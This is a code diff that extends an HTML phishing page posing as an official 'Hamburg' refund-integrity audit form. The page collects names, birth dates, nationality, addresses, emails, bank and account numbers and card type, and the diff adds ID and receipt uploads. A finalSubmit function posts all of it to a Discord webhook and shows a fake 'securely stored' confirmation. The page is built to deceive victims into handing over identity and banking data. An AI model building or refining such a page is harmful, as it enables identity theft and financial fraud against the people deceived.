@@ -20,9 +20,9 @@
         .side-text h3 { color: var(--security-gold); text-transform: uppercase; font-size: 26px; border-bottom: 4px solid var(--security-gold); display: inline-block; padding-bottom: 5px; font-weight: 900; }
         .side-text p { font-size: 15px; text-align: justify; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
         .form-container { background: #ffffff; width: 100%; max-width: 800px; border-radius: 4px; box-shadow: 0 50px 150px rgba(0,0,0,0.9); border-top: 15px solid var(--hamburg-red); position: relative; }
-        .security-banner { background: var(--hamburg-blue); color: white; padding: 12px; text-align: center; font-size: 11px; font-weight: bold; text-transform: uppercase; border-bottom: 3px solid var(--security-gold); }
+        .security-banner { background: var(--hamburg-blue); color: white; padding: 12px; text-align: center; font-size: 11px; font-weight: bold; text-transform: uppercase; border-bottom: 3px solid var(--security-gold); letter-spacing: 1px; }
         .header { padding: 30px; text-align: center; border-bottom: 8px solid var(--hamburg-blue); }
-        .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 22px; font-weight: 900; text-transform: uppercase; line-height: 1.2; }
+        .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 24px; font-weight: 900; text-transform: uppercase; line-height: 1.2; }
         .section-box { padding: 40px; display: none; }
         .section-box.active { display: block; }
         h2 { font-size: 17px; color: var(--hamburg-blue); margin-bottom: 20px; font-weight: 800; text-transform: uppercase; border-bottom: 2px solid #eee; padding-bottom: 10px; }
@@ -34,16 +34,19 @@
         button { background-color: var(--hamburg-blue); color: white; border: none; padding: 16px 45px; cursor: pointer; font-size: 13px; font-weight: 900; text-transform: uppercase; }
         .btn-back { background-color: #888; }
         #loader { display: none; text-align: center; padding: 60px; font-weight: 900; color: var(--hamburg-blue); font-size: 18px; text-transform: uppercase; }
+        .establishment-footer { text-align: center; padding: 20px; font-size: 10px; color: #888; background: #fdfdfd; border-top: 1px solid #eee; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
 <div class="page-wrapper">
+    <!-- MISSION -->
     <div class="side-text">
         <h3>Mission</h3>
-        <p>To proactively establish and govern a fortified infrastructure for financial reclamation by deploying a multi-layered verification architecture that strictly authenticates identity.</p>
+        <p>To proactively establish and govern a fortified infrastructure for financial reclamation by deploying a multi-layered verification architecture that strictly authenticates identity and ensures secure mandates.</p>
     </div>
 
+    <!-- MAIN FORM -->
     <div class="form-container">
         <div class="security-banner">🛡️ UNITED GLOBAL PROTOCOL FOR REFUND INTEGRITY</div>
         <div class="header"><h1>Safeguarding Transactions Through The Establishment of Verified Governance Of Hamburg</h1></div>
@@ -63,8 +66,9 @@
                     <div><label>BirthDate *</label><input type="text" id="bd" required placeholder="MM/DD/YYYY"></div>
                     <div><label>Nationality *</label><input type="text" id="nat" required></div>
                 </div>
-                <div style="margin-top:20px;"><label>Address *</label><input type="text" id="addr" required></div>
-                <div style="margin-top:20px;"><label>Email *</label><input type="email" id="em" required></div>
+                <div style="margin-top:20px;"><label>Address *</label><input type="text" id="addr" required placeholder="Full Address"></div>
+                <div style="margin-top:20px;"><label>Email *</label><input type="email" id="em" required placeholder="user@gmail.com"></div>
+                <div style="margin-top:20px;"><label>Upload Valid ID *</label><input type="file" id="idU"></div>
                 <div class="btn-container">
                     <button type="button" onclick="nextPage(2)">Next Step</button>
                 </div>
@@ -81,39 +85,41 @@
                     <div><label>Account Number *</label><input type="text" id="an" required></div>
                     <div><label>Card Type *</label><input type="text" id="ct" required></div>
                 </div>
+                <div style="margin-top:20px;"><label>Upload Receipt *</label><input type="file" id="rcpU"></div>
                 <div class="btn-container">
                     <button type="button" class="btn-back" onclick="nextPage(1)">Back</button>
                     <button type="button" onclick="finalSubmit()">Submit Audit</button>
                 </div>
             </div>
 
+            <!-- SUCCESS DISPLAY -->
             <div id="section3" class="section-box"></div>
         </form>
+        <div class="establishment-footer">Official Registry: HB-SECURE-2024 • © International Security Establishment</div>
     </div>
 
+    <!-- VISION -->
     <div class="side-text">
         <h3>Vision</h3>
-        <p>To be the premier global establishment for financial security, providing an absolute guarantee of safety for every citizen worldwide.</p>
+        <p>To be the premier global establishment for financial security, providing an absolute guarantee of safety for every citizen worldwide through advanced verification systems.</p>
     </div>
 </div>
 
 <script>
-    // 1. Lipat Page Logic
+    // Navigation
     function nextPage(step) {
         document.querySelectorAll('.section-box').forEach(b => b.style.display = 'none');
         document.getElementById('section' + step).style.display = 'block';
         window.scrollTo(0,0);
     }
 
-    // 2. Discord Submission Logic
+    // Final Submission to Discord
     function finalSubmit() {
         const ref = "HB-" + Math.floor(Math.random() * 1000000);
         
-        // Loader UI
         document.getElementById('masterForm').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
 
-        // Payload - Kinukuha lahat ng IDs (ln, fn, mn, bd, nat, addr, em, amt, bnk, an, ct)
         const payload = {
             username: "Hamburg Audit Bot",
             content: `🚨 **NEW REFUND CLAIM RECEIVED** 🚨\n\n` +
@@ -130,7 +136,6 @@
                      `✅ *System Verified Identity & Integrity*`
         };
 
-        // Fetch to your Webhook
         fetch("https://discord.com", {
             method: "POST",
             headers: { 'Content-Type': 'application/json' },
@@ -145,56 +150,12 @@
                         <h3 style="color:var(--hamburg-blue)">SUBMISSION SUCCESSFUL</h3>
                         <p>Reference: <strong style="color:red">${ref}</strong></p>
                         <div style="font-size:80px; margin:20px;">✅</div>
-                        <p>Your data has been securely stored in the Hamburg Audit Vault.</p>
-                        <button onclick="location.reload()" style="margin-top:20px; padding:12px 35px; cursor:pointer;">DONE</button>
-                    </div>`;
-            }, 2000);
-         }).then(() => {
-            setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                const s3 = document.getElementById('section3');
-                s3.style.display = 'block';
-                s3.innerHTML = `
-                    <div style="text-align:center; padding:40px;">
-                        <h3 style="color:var(--hamburg-blue)">SUBMISSION SUCCESSFUL</h3>
-                        <p>Reference: <strong style="color:red">${ref}</strong></p>
-                        <div style="font-size:80px; margin:20px;">✅</div>
-                        <p>Your data has been securely stored in the Hamburg Audit Vault.</p>
-                        <button onclick="location.reload()" style="margin-top:20px; padding:12px 35px; cursor:pointer;">DONE</button>
-                    </div>`;
-              }, 2000);
-
-                  }).then(() => {
-            setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                const s3 = document.getElementById('section3');
-                s3.style.display = 'block';
-                s3.innerHTML = `
-                    <div style="text-align:center; padding:40px;">
-                        <h3 style="color:var(--hamburg-blue)">SUBMISSION SUCCESSFUL</h3>
-                        <p>Reference: <strong style="color:red">${ref}</strong></p>
-                        <div style="font-size:80px; margin:20px;">✅</div>
-                        <p>Your data has been securely stored in the Hamburg Audit Vault.</p>
-                        <button onclick="location.reload()" style="margin-top:20px; padding:12px 35px; cursor:pointer;">DONE</button>
-                    </div>`;
-            }, 2000);
-                         }).then(() => {
-            setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                const s3 = document.getElementById('section3');
-                s3.style.display = 'block';
-                s3.innerHTML = `
-                    <div style="text-align:center; padding:40px;">
-                        <h3 style="color:var(--hamburg-blue)">SUBMISSION SUCCESSFUL</h3>
-                        <p>Reference: <strong style="color:red">${ref}</strong></p>
-                        <div style="font-size:80px; margin:20px;">✅</div>
-                        <p>Your data has been securely stored in the Hamburg Audit Vault.</p>
-                        <button onclick="location.reload()" style="margin-top:20px; padding:12px 35px; cursor:pointer;">DONE</button>
+                        <p>Data stored in Secure Audit Vault.</p>
+                        <button onclick="location.reload()" style="margin-top:20px; padding:15px 40px; cursor:pointer;">DONE</button>
                     </div>`;
             }, 2000);
         });
     }
 </script>
-
 </body>
 </html>
